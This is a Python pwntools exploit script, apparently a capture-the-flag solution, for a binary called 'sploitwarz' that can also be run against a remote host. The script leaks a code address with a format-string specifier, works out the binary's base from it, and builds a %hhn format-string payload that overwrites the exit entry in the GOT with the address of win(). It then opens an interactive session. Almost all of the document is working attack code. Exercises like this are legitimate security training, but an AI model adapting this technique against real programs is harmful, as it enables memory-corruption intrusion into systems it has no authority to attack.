#!/usr/bin/env python3

from pwn import *

def start():
    global p
    global elf
    prog  = "./sploitwarz"

    if args.REMOTE:
        ip   = "plsdonthaq.me"
        port = 4004
        p = remote(ip, port)
        elf = ELF(prog)

    else:
        p = process(prog)
        elf = p.elf

def build_payload(win, target, offset, padding):
    payload = b"A" * padding
    payload += p32(target + 0) + p32(target + 1) + p32(target + 2) + p32(target + 3)
    payload += f"%{240 - padding}c".encode()

    for i in range(4):
        byte = win & 0xff
        win >>= 8
        if (byte == 0):
            payload += f"%{offset + i}$hhn".encode()
        else:
            payload += f"%{byte}c%{offset + i}$hhn%{256 - byte}c".encode()

    return payload

def gamble():
    p.sendlineafter("do?", "g")

    p.recvuntil("max ")
    p.sendline(p.recvuntil("):", drop=True)) # the max amount you can gamble

    p.sendline(str(check_fib())) # the winning number is a non fibonacci number

def get_address():
    p.recvuntil("done, ")
    address = int(p.recvuntil("!", drop=True), 16)
    p.sendlineafter("...\n", "\n\n")

    return address

# the correct gambling option is the one not in the fibonacci sequence
# takes in the five options and return the index of the correct option
def check_fib(): 
    options = []
    p.recvuntil(":\n")
    for i in range(5):
        p.recvuntil(f"{i + 1}) ".encode())
        options.append(int(p.recvline().strip()))
    
    for i in range(5):
        phi = options[i] * (0.5 + 0.5 * math.sqrt(5.0))
        if ((options[i] == 0) or (abs(round(phi) - phi) < (1.0 / options[i]))):
            continue
        return i + 1

def change_handle(handle):
    p.sendlineafter("do?", "c")
    p.sendlineafter("handle?", handle)

start()

p.sendlineafter(">", "%3$p")
gamble()
do_gamble = get_address() - 293

# Find the base of the binary, and use this to find win() and exit@GOT
elf.address = do_gamble - elf.symbols["do_gamble"]
payload = build_payload(elf.symbols["win"], elf.got["exit"], 5, 0)

change_handle(payload)
gamble()

p.interactive()
p.close()